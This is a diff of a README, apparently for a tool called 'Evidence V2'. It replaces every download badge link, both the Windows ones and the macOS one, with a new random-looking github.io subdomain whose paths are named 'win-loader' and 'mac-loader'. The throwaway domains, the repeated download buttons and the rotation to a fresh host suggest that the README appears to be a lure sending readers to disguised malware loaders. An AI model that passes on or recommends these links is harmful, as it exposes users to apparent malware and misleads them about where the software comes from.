@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
 
 </div>
 
@@ -55,9 +55,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://lpysehglnrlc.github.io/win-loader/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mjztsbomuptb.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
 
 </div>
 
